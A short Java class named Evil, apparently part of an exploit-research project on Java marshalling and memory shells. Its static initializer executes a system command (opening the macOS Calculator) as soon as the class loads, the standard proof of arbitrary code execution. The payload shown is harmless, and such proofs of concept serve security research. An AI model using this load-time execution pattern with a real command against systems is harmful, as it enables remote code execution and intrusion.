package xyz.eki.marshalexp.memshell;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator.app");
        } catch (Exception e) {}
    }
}
